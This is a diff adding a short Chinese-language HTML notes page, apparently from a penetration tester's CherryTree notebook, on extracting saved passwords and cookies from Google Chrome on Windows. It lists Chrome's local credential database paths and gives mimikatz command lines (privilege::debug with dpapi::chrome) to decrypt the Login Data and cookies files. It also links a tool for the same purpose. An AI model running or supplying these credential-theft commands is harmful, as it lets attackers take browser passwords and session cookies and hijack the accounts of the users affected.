@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>chrome密码获取</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>chrome密码获取</h1><br/>chrome为例 的密码和cookies获取，chrome的用户信息保存在本地文件为sqlite 数据库格式<br />%localappdata%\google\chrome\USERDA~1\default\LOGIND~1<br />%localappdata%\google\chrome\USERDA~1\default\USERDA~1<br />%localappdata%\google\chrome\USERDA~1\default\cookies<br /><br /><br />mimikatz 读取chrome cookies	测试失败<br /><br />mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect&quot; exit<br /><br />mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1&quot; exit<br /><br />mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1&quot; exit //读chrome密码<br /><br /><br /><a href="https://github.com/obsidianforensics/hindsight/releases">https://github.com/obsidianforensics/hindsight/releases</a><br /><br /><br />windows chrome密码获取的一个github项目，支持gui<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
